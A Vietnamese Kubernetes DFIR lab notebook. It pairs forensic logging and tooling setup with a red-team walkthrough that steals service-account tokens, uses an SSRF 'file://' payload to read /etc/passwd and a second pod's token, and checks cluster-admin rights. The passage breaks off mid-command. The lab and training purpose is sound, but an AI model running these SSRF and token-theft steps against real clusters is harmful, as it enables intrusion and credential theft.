# K8s DFIR Lab – Phase 1: Logging & DFIR Preparation

## Objective

Thiết lập nền tảng phục vụ DFIR trên Kubernetes, bao gồm:

* Audit logging (control-plane visibility)
* Log hệ thống và container runtime
* Bộ công cụ phục vụ snapshot, phân tích tĩnh và động

Mục tiêu của phase này là đảm bảo:

* Có đủ dữ liệu để điều tra
* Có đủ công cụ để xử lý incident

---

## Phase 1 – Checklist

### Logging

* [ ] Enable Kubernetes audit logging
* [ ] Xác nhận log tại `/var/log/kubernetes/audit.log`
* [ ] Kiểm tra kubelet log
* [ ] Kiểm tra container runtime log

### Tooling

* [ ] Cài đặt tool snapshot (CRIU)
* [ ] Cài đặt tool static analysis
* [ ] Cài đặt tool dynamic analysis
* [ ] Cài đặt tool runtime/debug

### Validation

* [ ] Log ghi nhận API activity
* [ ] Tool hoạt động bình thường
* [ ] Có thể đọc log và inspect container

---

## 1. Audit Logging (Control Plane Visibility)

<details>
<summary>Cấu hình audit logging</summary>

### Mục đích

Ghi lại toàn bộ hành vi API:

* ai thực hiện
* thao tác gì
* resource nào bị tác động

### Log path

```bash
/var/log/kubernetes/audit.log
```

### Kiểm tra

```bash
sudo tail -f /var/log/kubernetes/audit.log
```

### Test

```bash
kubectl create ns dfir-test
kubectl delete ns dfir-test
```

### Ý nghĩa DFIR

Audit log cung cấp:

* timeline cấp control-plane
* truy vết hành vi attacker qua API
* phát hiện truy cập secrets, RBAC abuse

</details>

---

## 2. Node & Runtime Logging

<details>
<summary>Log hệ thống và container runtime</summary>

### Mục đích

Thu thập log ở cấp node để bổ sung cho audit log.

### Các nguồn log quan trọng

```bash
# kubelet
journalctl -u kubelet

# container runtime
crictl ps
crictl logs <container-id>

# pod log
kubectl logs <pod>
```

### Ý nghĩa DFIR

* kubelet log: hành vi scheduling, container lifecycle
* runtime log: stdout/stderr của container
* kết hợp với audit log để dựng timeline đầy đủ

</details>

---

## 3. Snapshot & Restore Tooling

<details>
<summary>Chuẩn bị công cụ checkpoint</summary>

### Mục đích

* snapshot container đang chạy
* lưu state: memory, process, filesystem
* phục vụ forensic

### Tools

| Tool          | Mục đích                   |
| ------------- | -------------------------- |
| criu          | checkpoint/restore process |
| checkpointctl | đọc checkpoint             |
| buildah       | build image từ checkpoint  |
| crictl        | debug container            |

### Cài đặt

```bash
sudo apt update
sudo apt install -y criu jq curl tar
```

### Ý nghĩa DFIR

Checkpoint là artifact quan trọng nhất:

* giữ lại RAM (tránh mất khi pod bị xóa)
* lưu process tree
* lưu network state

</details>

---

## 4. Static Analysis Tooling

<details>
<summary>Phân tích artifact</summary>

### Mục đích

Phân tích dữ liệu từ checkpoint:

* file bị sửa
* process
* memory
* credential

### Tools

| Tool          | Mục đích               |
| ------------- | ---------------------- |
| checkpointctl | inspect process, mount |
| crit          | parse CRIU image       |
| strings       | extract data từ memory |
| grep          | tìm IOC                |
| jq            | parse JSON             |

### Ví dụ

```bash
strings checkpoint/* | grep http
```

### Ý nghĩa DFIR

Có thể tìm:

* URL C2
* token
* command attacker

</details>

---

## 5. Dynamic Analysis Tooling

<details>
<summary>Phân tích hành vi runtime</summary>

### Mục đích

Phân tích container sau khi restore:

* syscall
* network
* execution flow

### Tools

| Tool         | Mục đích            |
| ------------ | ------------------- |
| tcpdump      | capture network     |
| strace       | trace syscall       |
| ss / netstat | kiểm tra connection |
| lsof         | file descriptor     |

### Cài đặt

```bash
sudo apt install -y tcpdump strace net-tools lsof
```

### Ý nghĩa DFIR

* quan sát hành vi attacker
* phát hiện C2
* theo dõi command execution

</details>

---

## 6. Runtime & Debug Tooling

<details>
<summary>Quan sát hệ thống</summary>

### Tools

| Tool       | Mục đích        |
| ---------- | --------------- |
| kubectl    | quản lý cluster |
| crictl     | debug container |
| journalctl | log hệ thống    |
| tail       | theo dõi log    |

### Kiểm tra

```bash
kubectl get nodes
crictl ps
```

</details>

---

## 7. DFIR Workflow Mapping

<details>
<summary>Mapping tổng thể</summary>

| Phase            | Thành phần          |
| ---------------- | ------------------- |
| Detection        | audit log           |
| Snapshot         | criu                |
| Storage          | filesystem          |
| Static analysis  | checkpointctl, crit |
| Dynamic analysis | tcpdump, strace     |
| Investigation    | grep, strings       |

### Flow

1. Detect từ audit log
2. Snapshot container
3. Lưu checkpoint
4. Phân tích:

   * static
   * dynamic

</details>

---

## Phase 1 Completion Criteria

Phase 1 được coi là hoàn thành khi:

* Audit log ghi nhận được API activity
* Có thể xem log kubelet và container runtime
* Tool CRIU hoạt động
* Có thể inspect container bằng crictl
* Có thể đọc và phân tích log

---

## Next Phase

Phase 2: Runtime Detection và trigger checkpoint


# I. Tổng thể hệ thống Lab

Môi trường lab này được triển khai dưới dạng một cụm Kubernetes nội bộ hoạt động trong mạng private, cung cấp dịch vụ Jupyter trên nền tảng cloud. Trong cụm hiện diện ít nhất hai workload chính:

- **Pod 1: `jupyter-lab`**
Đây là điểm truy cập ban đầu của người dùng. Thông qua giao diện Jupyter, người dùng có thể đăng nhập và thực thi mã Python bên trong container.
- **Pod 2: `internal-processor`**
Đây là dịch vụ nội bộ mà Pod 1 có thể nhận diện thông qua cơ chế service discovery mặc định của Kubernetes. Dịch vụ này để lộ một endpoint `fetch` dùng cho xử lý nội bộ.

Ngoài hai workload chính, hệ thống còn bao gồm:

- **Kubernetes API Server**, chịu trách nhiệm điều phối và quản trị toàn bộ cụm.
- **Node hạ tầng** vận hành các pod, sử dụng địa chỉ IP private thuộc dải `192.168.x.x`.

# II. Phase 1 – Mục tiêu của Red Team

Trong giai đoạn đầu, mục tiêu của Red Team là bắt đầu từ **Pod 1 (`jupyter-lab`)** như một điểm foothold ban đầu, từ đó thực hiện **lateral movement sang Pod 2 (`internal-processor`)**, sau đó tiếp tục mở rộng phạm vi kiểm soát nhằm **thoát khỏi ranh giới container và tiến tới mức ảnh hưởng trên toàn bộ Kubernetes host**.

> Workflow attack
> 

```jsx
[Pod1: jupyter-lab]
   │
   │ SSRF via /fetch?url=file://... → đọc file từ Pod2
   ▼
[Pod2: internal-processor]
   │ automountServiceAccountToken: true (đã patch)
   │ SSRF endpoint hoạt động
   ▼
[Token Theft]
   │ Steal SA token của app-sa qua SSRF
   ▼
[K8s API Server]
   │ SelfSubjectAccessReview → cluster-admin: true
   │ pods/exec: true
   ▼
[Node Proxy API]
   │ GET /api/v1/nodes/{name}/proxy/pods → full pod specs
   │ Thấy hardcoded secrets trong env vars 
   │ Thấy privileged pod với hostPath mount
   ▼
[Escalation]
   │ Option A: Exec vào longth2-test → read /host/etc/shadow
   │ Option B: Dùng Docker socket → run container trên host
   │ Option C: Dùng AWS credentials → pivot sang cloud
   ▼
```

# **Initial Access & Reconnaissance via Jupyter Lab**

**1. Tổng quan**
Truy cập vào `Jupyter`, lợi dụng khả năng thực thi mã Python trong môi trường notebook để gọi lệnh hệ thống thông qua `os.system`, từ đó phục vụ cho quá trình khai thác ban đầu.

**2. Kỹ thuật khai thác**

Attacker sử dụng module `subprocess` của Python để thực thi lệnh hệ thống, nhằm xác định context bảo mật và thông tin môi trường của container:

```jsx
import os
import subprocess

print(subprocess.getoutput('id'))
print(subprocess.getoutput('hostname'))

env_vars = subprocess.getoutput('env | grep -i svc')
print(env_vars)
```

### **2.2. Kết quả thu thập được**

![image.png](attachment:511c2d38-c243-4d8f-a49a-13759edf2fdd:image.png)

| Thông tin | Giá trị | Ý nghĩa bảo mật |
| --- | --- | --- |
| **User Context** | `uid=1000(jovyan) gid=100(users)` | Container chạy với non-root user, hạn chế một số vector escalation |
| **Hostname** | `jupyter-lab-6694c6bcfd-j44tb` | Xác nhận đang trong pod Jupyter, namespace `corp-internal` |
| **INTERNAL_PROCESSOR_SVC_SERVICE_HOST** | `10.101.66.187` | 🎯 ClusterIP của service mục tiêu - entry point cho lateral movement |
| **INTERNAL_PROCESSOR_SVC_PORT_8080_TCP_ADDR** | `10.101.66.187:8080` | Port và địa chỉ để kết nối tới Flask app internal |
| **JUPYTER_LAB_SVC_PORT_8888_TCP_ADDR** | `10.103.208.208:8888` | Thông tin service của chính pod hiện tại |

---

## **🔹 3. Phân tích kỹ thuật**

### **3.1. Service Discovery qua Environment Variables**

Kubernetes tự động inject environment variables vào container cho các Service trong cùng namespace theo định dạng:

![image.png](attachment:f6214b07-0b67-4da6-952c-035f9fb4ce75:ef2d02b6-8532-4f5f-b8b9-ca925c866fad.png)

```jsx
<SERVICE_NAME>_SERVICE_HOST=<ClusterIP>
<SERVICE_NAME>_PORT_<PORT>_TCP_ADDR=<ClusterIP>
```

→ Từ đó cũng như ta xác định được service đang chạy trên môi trường k8s

# Leo quyền bằng phương pháp chroot

Sau khi xác lập foothold trong container `jupyter-lab` với user context `jovyan (uid=1000)`, attacker tiến hành đánh giá khả năng leo quyền (privilege escalation). Mặc dù container được cấu hình chạy với non-root user, việc kết hợp giữa **thiếu hardened security context** và **khả năng truy cập filesystem** đã mở ra vector tấn công leo quyền thông qua kỹ thuật **filesystem manipulation và namespace escape**.

> ⚠️ **Technical Clarification**: `chroot` đơn thuần không trực tiếp leo quyền từ uid=1000 lên root. Tuy nhiên, trong môi trường Kubernetes với cấu hình bảo mật chưa tối ưu, attacker có thể kết hợp nhiều kỹ thuật (writable hostPath mount, SUID binary exploitation, hoặc kernel vulnerability) để đạt được mục tiêu tương tự.
> 

# Sau khi chroot, có thểt thoả sức cài tool không bị giới hạn về quyền

![image.png](attachment:b1370379-9b0d-4688-98e5-2926220b4fe2:image.png)

# Reconaise BRAC

Sau khi xác lập foothold trong container `jupyter-lab`, attacker tiến hành khám phá cơ chế xác thực nội bộ của Kubernetes. Việc phát hiện ServiceAccount token được tự động mount vào filesystem container đã mở ra khả năng tương tác với Kubernetes API Server — bước then chốt để đánh giá quyền hạn (RBAC) và xác định vector leo quyền tiếp theo.

### **2.1. ServiceAccount Token Discovery**

Kubernetes tự động mount credentials của ServiceAccount vào đường dẫn chuẩn trong container

![image.png](attachment:9845951a-b74d-44b4-bcd9-433bb3810873:image.png)

![image.png](attachment:c07e74d3-90b5-472b-afb9-11b3e681f2aa:image.png)

```jsx
(base) jovyan@jupyter-lab-6694c6bcfd-j44tb:~$ ls /var/run/secrets/kubernetes.io/serviceaccount/
ca.crt  namespace  token
(base) jovyan@jupyter-lab-6694c6bcfd-j44tb:~$ cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
corp-internal(base) jovyan@jupyter-lab-6694c6bls -la /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null/ 2>/dev/null
total 4
drwxrwsrwt 3 root users  140 Mar 30 02:16 .
drwxr-xr-x 3 root root  4096 Mar 30 02:16 ..
drwxr-sr-x 2 root users  100 Mar 30 02:16 ..2026_03_30_02_16_18.3165591300
lrwxrwxrwx 1 root users   13 Mar 30 02:16 ca.crt -> ..data/ca.crt
lrwxrwxrwx 1 root users   32 Mar 30 02:16 ..data -> ..2026_03_30_02_16_18.3165591300
lrwxrwxrwx 1 root users   16 Mar 30 02:16 namespace -> ..data/namespace
lrwxrwxrwx 1 root users   12 Mar 30 02:16 token -> ..data/token
(base) jovyan@jupyter-lab-6694c6bcfd-j44tb:~$ cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null
eyJhbGciOiJSUzI1NiIsImtpZCI6ImRxQ0ZHc3BuLUFBczA3ZHd2c3c1aGxpSTlWamlncmZxZUJxME5ubTVXbDQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxODA2MzcyOTc4LCJpYXQiOjE3NzQ4MzY5NzgsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiYjg4MjA1MTUtYjgxZC00NjYxLWJjYjQtNzAzYTZlN2EyODVkIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJjb3JwLWludGVybmFsIiwibm9kZSI6eyJuYW1lIjoibG9uZ3RoLWNsdXN0ZXIiLCJ1aWQiOiI2ZjhiZTdhNi04OWNhLTQyZTYtOTQ0My1lZTQ5YjNkMGI4YzQifSwicG9kIjp7Im5hbWUiOiJqdXB5dGVyLWxhYi02Njk0YzZiY2ZkLWo0NHRiIiwidWlkIjoiMGZmMDdlMTEtNmUyMS00ZTZhLWJiZDMtNDdiZTU4MWZlODVmIn0sInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJkZWZhdWx0IiwidWlkIjoiNzNkNmYwMDQtODU0Yi00ZmJmLWExNjAtOTI5MWE3ZDExMTUyIn0sIndhcm5hZnRlciI6MTc3NDg0MDU4NX0sIm5iZiI6MTc3NDgzNjk3OCwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmNvcnAtaW50ZXJuYWw6ZGVmYXVsdCJ9.j1KGP3sCmuPfikDF4f9GMVnZinVjiKrkzAj2DgJjHiBvlEV9YxfmDixZKqFygXxxRqqGcxQA-KMihoNAnUrzwWgbhefcCRTdgw7KPlVl3N4DAcJhxsD6sjZ6PswF_BSwdRLHyRErgy2d4E0sp3AJuKol7U4z-nSB_D4NXg73kJN5SnR1uiBK5tKoO_awp9jnVdcCvggbzPX8Gh1VkordZe4RcddCsV4eIiJ7p7qRhJ0R_JaP7mvPcv5rn6iBsK6MZrR3lCc8tTpS5i3_HU0XGGWiG1pnhk7cBPRCY4V0UHourBbF_t_lSXL5KnlMxm-CKvzUBSeOQvUDKwnJXtkKaw(base) jovyan@jupyter-lab-6694c6bcfd-j44tb:~$ 
```

```jsx
{
  "aud": [
    "https://kubernetes.default.svc.cluster.local"
  ],
  "exp": 1806378811,
  "iat": 1774842811,
  "iss": "https://kubernetes.default.svc.cluster.local",
  "jti": "1cd9c775-3248-4db6-953e-61788f785f05",
  "kubernetes.io": {
    "namespace": "corp-internal",
    "node": {
      "name": "longth-cluster",
      "uid": "6f8be7a6-89ca-42e6-9443-ee49b3d0b8c4"
    },
    "pod": {
      "name": "jupyter-lab-6694c6bcfd-j44tb",
      "uid": "0ff07e11-6e21-4e6a-bbd3-47be581fe85f"
    },
    "serviceaccount": {
      "name": "default",
      "uid": "73d6f004-854b-4fbf-a160-9291a7d11152"
    },
    "warnafter": 1774846418
  },
  "nbf": 1774842811,
  "sub": "system:serviceaccount:corp-internal:default"
}
```

Sau khi thu thập được ServiceAccount token từ đường dẫn mount mặc định `/var/run/secrets/kubernetes.io/serviceaccount/token`, attacker tiến hành phân tích cấu trúc JWT (JSON Web Token) để xác định danh tính, phạm vi ủy quyền, và các thông tin metadata quan trọng phục vụ cho quá trình khai thác tiếp theo.

### **2.2. Decoded Payload Analysis**

Sử dụng công cụ giải mã JWT (jwt.io hoặc `jq` + base64), attacker trích xuất được các claims quan trọng:

### **Authentication & Authorization Claims**

| Claim | Giá trị | Ý nghĩa bảo mật |
| --- | --- | --- |
| **`sub`** (Subject) | `system:serviceaccount:corp-internal:default` | 🎯 Định danh duy nhất của token — dùng để map tới RBAC policies |
| **`iss`** (Issuer) | `https://kubernetes.default.svc.cluster.local` | Xác nhận token được ký bởi Kubernetes API Server của cluster hiện tại |
| **`aud`** (Audience) | `["https://kubernetes.default.svc.cluster.local"]` | Giới hạn token chỉ hợp lệ khi gọi tới API Server nội bộ — ngăn replay attack ra bên ngoài |
| **`jti`** (JWT ID) | `1cd9c775-...` | ID duy nhất của token — hỗ trợ audit logging và token revocation |

### **3.2. Temporal Claims (Thời hạn sử dụng)**

| Claim | Giá trị (Unix timestamp) | Giá trị (Human-readable) | Ý nghĩa |
| --- | --- | --- | --- |
| **`iat`** (Issued At) | `1774842811` | ~ Mar 30, 2026 02:13:31 UTC | Thời điểm token được cấp |
| **`nbf`** (Not Before) | `1774842811` | ~ Mar 30, 2026 02:13:31 UTC | Token chỉ hợp lệ từ thời điểm này |
| **`exp`** (Expiration) | `1806378811` | ~ Mar 30, 2027 02:13:31 UTC | ⚠️ **Token có hạn ~1 năm** — window of opportunity dài cho attacker |
| **`warnafter`** | `1774846418` | ~ Mar 30, 2026 03:13:38 UTC |  |

### **3.3. Kubernetes-Specific Metadata (`kubernetes.io` claim)**

| Field | Giá trị | Ứng dụng khai thác |
| --- | --- | --- |
| `namespace` | `corp-internal` | Xác định scope RBAC — các permission chỉ áp dụng trong namespace này (trừ cluster-scoped resources) |
| `node.name` | `longth-cluster` | 🎯 Xác định tên node vật lý — hữu ích cho node-targeted attacks hoặc lateral movement |
| `node.uid` | `6f8be7a6-...` | Định danh duy nhất của node — dùng để correlate logs hoặc target specific node APIs |
| `pod.name` | `jupyter-lab-6694c6bcfd-j44tb` | Xác định chính xác pod hiện tại — hữu ích cho pod-specific enumeration hoặc cleanup evasion |
| `pod.uid` | `0ff07e11-...` | Định danh duy nhất của pod — ổn định hơn pod name (có thể thay đổi khi restart) |
| `serviceaccount.name` | `default` | 🎯 Tên SA để query RBAC: `kubectl get rolebinding -n corp-internal -o yaml | grep "default"` |

### **2.2. Tooling Challenge & Workaround**

**Vấn đề**: Container không có sẵn `kubectl` — công cụ CLI tiêu chuẩn để tương tác với Kubernetes API.

```jsx
(base) jovyan@jupyter-lab-6694c6bcfd-j44tb:~$ kubectl
bash: kubectl: command not found
(base) jovyan@jupyter-lab-6694c6bcfd-j44tb:~$ 
```

**Giải pháp**: Download binary `kubectl` tương thích trực tiếp từ nguồn chính thức:

![image.png](attachment:02f1ec79-543e-44ef-b288-2e2c75d3b51a:image.png)

### **2.3. RBAC Enumeration Results**

Thực hiện kiểm tra quyền hạn của ServiceAccount `default` trong namespace `corp-internal`:

![image.png](attachment:efab69dd-94ac-4b7b-8d29-045178e1d235:image.png)

![image.png](attachment:99d72f82-9ee3-442f-bd89-eb1aa406fb61:image.png)

```jsx
(base) jovyan@jupyter-lab-6694c6bcfd-j44tb:/tmp/longth$ TOKEN="$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)"
APISERVER="https://kubernetes.default.svc"
CA="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"

./kubectl --server="$APISERVER" --certificate-authority="$CA" --token="$TOKEN" auth can-i --list -n corp-internal
Resources                                       Non-Resource URLs                      Resource Names   Verbs
selfsubjectreviews.authentication.k8s.io        []                                     []               [create]
selfsubjectaccessreviews.authorization.k8s.io   []                                     []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                     []               [create]
                                                [/.well-known/openid-configuration/]   []               [get]
                                                [/.well-known/openid-configuration]    []               [get]
                                                [/api/*]                               []               [get]
                                                [/api]                                 []               [get]
                                                [/apis/*]                              []               [get]
                                                [/apis]                                []               [get]
                                                [/healthz]                             []               [get]
                                                [/healthz]                             []               [get]
                                                [/livez]                               []               [get]
                                                [/livez]                               []               [get]
                                                [/openapi/*]                           []               [get]
                                                [/openapi]                             []               [get]
                                                [/openid/v1/jwks/]                     []               [get]
                                                [/openid/v1/jwks]                      []               [get]
                                                [/readyz]                              []               [get]
                                                [/readyz]                              []               [get]
                                                [/version/]                            []               [get]
                                                [/version/]                            []               [get]
                                                [/version]                             []               [get]
                                                [/version]                             []               [get]
(base) jovyan@jupyter-lab-6694c6bcfd-j44tb:/tmp/longth$ 
```

[]()

→ Chỉ có quyền **`get` trên `/api/*` và `/apis/*`  , tuy nhiên với hai quyền này chưa thể lợi dụng được lateralmovement**

# Ko có quyền nhưng khai phá env

```jsx
env
SHELL=/bin/bash
KUBERNETES_SERVICE_PORT_HTTPS=443
KUBERNETES_SERVICE_PORT=443
INTERNAL_PROCESSOR_SVC_SERVICE_PORT=8080
CONDA_EXE=/opt/conda/bin/conda
_CE_M=
HOSTNAME=jupyter-lab-6694c6bcfd-j44tb
LANGUAGE=en_US.UTF-8
JUPYTER_LAB_SVC_SERVICE_PORT=8888
INTERNAL_PROCESSOR_SVC_PORT_8080_TCP_PROTO=tcp
NB_UID=1000
XML_CATALOG_FILES=file:///opt/conda/etc/xml/catalog file:///etc/xml/catalog
INTERNAL_PROCESSOR_SVC_PORT_8080_TCP=tcp://10.101.66.187:8080
PWD=/home/jovyan/work
INTERNAL_PROCESSOR_SVC_PORT_8080_TCP_PORT=8080
JUPYTER_TOKEN=labtoken123
CONDA_PREFIX=/opt/conda
JUPYTER_SERVER_URL=http://jupyter-lab-6694c6bcfd-j44tb:8888/
JUPYTER_LAB_SVC_SERVICE_PORT_WEB=8888
JUPYTER_LAB_SVC_PORT_8888_TCP=tcp://10.103.208.208:8888
LINES=55
HOME=/home/jovyan
LANG=en_US.UTF-8
KUBERNETES_PORT_443_TCP=tcp://10.96.0.1:443
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.webp=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
INTERNAL_PROCESSOR_SVC_PORT=tcp://10.101.66.187:8080
COLUMNS=222
JUPYTER_LAB_SVC_PORT_8888_TCP_ADDR=10.103.208.208
INTERNAL_PROCESSOR_SVC_SERVICE_HOST=10.101.66.187
NB_GID=100
CONDA_PROMPT_MODIFIER=(base) 
PYDEVD_USE_FRAME_EVAL=NO
INTERNAL_PROCESSOR_SVC_SERVICE_PORT_HTTP=8080
JUPYTER_LAB_SVC_SERVICE_HOST=10.103.208.208
JUPYTER_SERVER_ROOT=/home/jovyan
TERM=xterm-256color
_CE_CONDA=
CONDA_SHLVL=1
JUPYTER_LAB_SVC_PORT_8888_TCP_PROTO=tcp
SHLVL=1
PYXTERM_DIMENSIONS=80x25
CONDA_DIR=/opt/conda
KUBERNETES_PORT_443_TCP_PROTO=tcp
INTERNAL_PROCESSOR_SVC_PORT_8080_TCP_ADDR=10.101.66.187
KUBERNETES_PORT_443_TCP_ADDR=10.96.0.1
CONDA_PYTHON_EXE=/opt/conda/bin/python
JUPYTER_PORT=8888
CONDA_DEFAULT_ENV=base
NB_USER=jovyan
KUBERNETES_SERVICE_HOST=10.96.0.1
LC_ALL=en_US.UTF-8
KUBERNETES_PORT=tcp://10.96.0.1:443
KUBERNETES_PORT_443_TCP_PORT=443
JUPYTER_LAB_SVC_PORT=tcp://10.103.208.208:8888
PATH=/opt/conda/bin:/opt/conda/condabin:/opt/conda/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
JUPYTER_LAB_SVC_PORT_8888_TCP_PORT=8888
DEBIAN_FRONTEND=noninteractive
_=/usr/bin/env
```

```jsx
INTERNAL_PROCESSOR_SVC_SERVICE_HOST=10.101.66.187
```

→ env có khai báo thông tới container 2

```jsx
(base) jovyan@jupyter-lab-6694c6bcfd-j44tb:~/work$ wget -qO- -T 5 http://10.101.66.187:8080/

    <!DOCTYPE html>
    <html>
    <head>
      <title>Internal IAM</title>
      <style>
        body { background:#111; color:#0f0; font-family:monospace; padding:20px; }
        .muted { color:#9f9; }
      </style>
    </head>
    <body>
      <h1>[INTERNAL] IAM System</h1>
      <p>Server: internal-processor-86cb494bc7-h6lxw</p>
      <p class="muted">Zone: private | Status: ONLINE</p>
      <p>Health endpoint: <code>/healthz</code></p>
    </body>
    </html>
    (base) jovyan@jupyter-lab-6694c6bcfd-j44tb:~/work$ 
```

![image.png](attachment:31352c46-b324-4d6e-9e90-4bcaa032f8b7:image.png)

**Phát hiện pod2 có lỗ hổng SSRF**

```jsx
(base) jovyan@jupyter-lab-6694c6bcfd-j44tb:/tmp/longth$ wget -qO- "http://10.101.66.187:8080/fetch?url=file:///etc/passwd" 2>&1 | head -5
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
(base) jovyan@jupyter-lab-6694c6bcfd-j44tb:/tmp/longth$
```

![image.png](attachment:b1cc3968-c92f-4843-aaa2-dadb83e7cc98:image.png)

**Steal SA Token của Pod2**

```jsx
(base) jovyan@jupyter-lab-6694c6bcfd-j44tb:/tmp/longth$ wget -qO- "http://10.101.66.187:8080/fetch?url=file:///var/run/secrets/kubernetes.io/serviceaccount/token"
eyJhbGciOiJSUzI1NiIsImtpZCI6ImRxQ0ZHc3BuLUFBczA3ZHd2c3c1aGxpSTlWamlncmZxZUJxME5ubTVXbDQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxODA2Mzc4MDA4LCJpYXQiOjE3NzQ4NDIwMDgsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiZWNhNTZjNzYtYzk2Yi00YjE3LWFkNzQtNTczZGE4MWQwOGQwIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJjb3JwLWludGVybmFsIiwibm9kZSI6eyJuYW1lIjoibG9uZ3RoLWNsdXN0ZXIiLCJ1aWQiOiI2ZjhiZTdhNi04OWNhLTQyZTYtOTQ0My1lZTQ5YjNkMGI4YzQifSwicG9kIjp7Im5hbWUiOiJpbnRlcm5hbC1wcm9jZXNzb3ItNTk3Y2Y3YjdmYy14cDVodyIsInVpZCI6ImFhMTRkOGIyLWMyN2EtNDI1Ny1iOTZiLTI3ZWJmMGZlNzY2MiJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiYXBwLXNhIiwidWlkIjoiM2I2OWRkMjgtY2Y3Yy00MGJiLWI5YmQtNDQ3YzgyMDMyMjc3In0sIndhcm5hZnRlciI6MTc3NDg0NTYxNX0sIm5iZiI6MTc3NDg0MjAwOCwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmNvcnAtaW50ZXJuYWw6YXBwLXNhIn0.QMaEa-XTXE1nH1gQsiOwE0tbsdxFaqU3XW901OW1GV167rkEA2lz97YMyJTnKhmGfhwoZoo7wfrKQRSZeQLdDfOI4M8Qss-Sd9LHN5sVsBAWYXJAcHK25KWRZ1Wz-eHjYlzNwr0AAJ1KTaU4FhJ1tVayR2DNmiyAX6n3vWCurHnnhMCcV3nXWorK-V8nkGCt9LE8PEFHd_CTR25lhdJZYPfXPwMkXJqu54TQT-h6FGMTFRWH5AKJl7f3fd8pOQjJcVjnvLnUQpa0JvYAJn9I6b6d11Fi6AP7Cy9vZ7-ZGvUBhThchOVRJcUhPvLrMU_JL8lymDqGxRXsk5FnpA9Miw(base) jovyan@jupyter-lab-6694c6bcfd-j44tb:/tmp/longth$
```

**Lưu token vào biến cho tiện dùng**

![image.png](attachment:d17286ba-370e-4166-a694-aa18f72ca568:image.png)

**Check có quyền `cluster-admin` không**

**Check quyền cụ thể: pods/exec**

```jsx
(base) jovyan@jupyter-lab-6694c6bcfd-j44tb:/tmp/longth$ wget --no-check-certificate -qO- \
  --header="Authorization: Bearer ${TOKEN}" \
  --header="Content-Type: application/json" \
  --post-data='{"kind":"SelfSubjectAccessReview","apiVersion":"authorization.k8s.io/v1","spec":{"resourceAttributes":{"verb":"*","resource":"*"}}}' \
  "https://kubernetes.default.svc/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" 2>&1 | grep -o '"allowed":[^,}]*'
"allowed": true
(base) jovyan@jupyter-lab-6694c6bcfd-j44tb:/tmp/longth$ wget --no-check-certificate -qO- \
  --header="Authorization: Bearer ${TOKEN}" \
  --header="Content-Type: application/json" \
